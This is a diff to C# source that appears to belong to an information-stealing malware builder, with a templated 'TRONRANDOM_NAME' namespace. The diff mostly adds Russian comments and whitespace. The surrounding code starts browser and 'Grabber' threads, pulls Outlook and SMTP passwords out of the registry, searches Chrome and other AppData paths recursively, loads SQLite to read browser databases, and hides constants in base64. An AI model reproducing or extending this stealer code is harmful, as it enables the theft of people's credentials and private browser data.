@@ -79,7 +79,7 @@ namespace TRONRANDOM_NAME
             catch
             { }
 
-
+            
             if (TRON_basic_settings.Length > 0)
             {
                 Thread TRON_Browsers = new Thread(new ParameterizedThreadStart(TRONRANDOM_NAME.TRON_Browsers.TRON_s7));
@@ -120,7 +120,7 @@ namespace TRONRANDOM_NAME
                 else
                     TRON_threads[9] = TRONRANDOM_NAME.TRON_Grabber.TRON_Info;
 
-
+                // Запуск потоков в рандомном порядке
                 TRONRANDOM_NAME.TRON_Helper.TRON_random_threads(TRON_threads);
 
                 for (int i = 1; i < TRON_threads.Length; i++)
@@ -138,7 +138,8 @@ namespace TRONRANDOM_NAME
 
             }
 
-
+            
+			// Парсим правила пользователя
             if (TRON_user_rules.Length > 0)
             {
                 List<string> TRON_files = new List<string>();
@@ -294,7 +295,7 @@ namespace TRONRANDOM_NAME
 
         static void TRON_Info()
         {
-
+            // Этот метод собирает инфу без WMI
             string info = null;
             try
             {
@@ -571,7 +572,9 @@ namespace TRONRANDOM_NAME
                 "SMTP Password",
 
                 };
-
+                
+				// Ищем подключи
+				
                 for (int TRON_i = 0; TRON_i < TRON_paths.Length; TRON_i++)
                     TRON_creds += TRONRANDOM_NAME.TRON_Helper.TRON_OutlookRecursiveReg(TRON_paths[TRON_i], TRON_data);
 
@@ -800,7 +803,8 @@ namespace TRONRANDOM_NAME
             }
         }
 
-
+        
+		// Работа с ресурсами
         public static void TRON_extractsql()
         {
             try
@@ -872,7 +876,7 @@ namespace TRONRANDOM_NAME
             return TRON_s3.ToString().Remove(Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String("MA=="))), 1);
         }
 
-
+        // Обертки функций
         public static void TRON_Copy(object TRON_s1, object TRON_s2, object TRON_s3)
         {
             try
@@ -947,12 +951,13 @@ namespace TRONRANDOM_NAME
             return "null";
         }
         
-
+        
         public static object TRON_DirMatch(object TRON_path)
         {
             return Regex.Split((string)TRON_path, "(Local|Roaming)")[2].Split('\\')[1];
         }
         
+		// Рекурсивный поиск файлов
         public static List<string> TRON_GetFiles(object TRON_path, string[] TRON_pattern, bool TRON_recursive, string size)
         {
             List<string> TRON_files = new List<string>();
@@ -1134,6 +1139,7 @@ namespace TRONRANDOM_NAME
         [DllImport("[sqlitename]", EntryPoint = "sqlite3_step", CallingConvention = CallingConvention.Cdecl)]
         private static extern int TRON_s15(IntPtr stmt);
 
+        // Статические пути сбора файлов
         private static string[] TRON_crome_browsers = new string[]
         {
                 TRONRANDOM_NAME.TRON_Helper.TRON_localappdata + "\\Google\\Chrome\\",
@@ -1166,7 +1172,7 @@ namespace TRONRANDOM_NAME
 
                 SetDllDirectory(TRONRANDOM_NAME.TRON_Helper.TRON_programdata);
 
-
+                // В зависимости от метода сбора стартуем соответствующие потоки
                 if ((bool)TRON_recursive)
                 {
                     string[] TRON_paths = { TRONRANDOM_NAME.TRON_Helper.TRON_localappdata, TRONRANDOM_NAME.TRON_Helper.TRON_appdata };
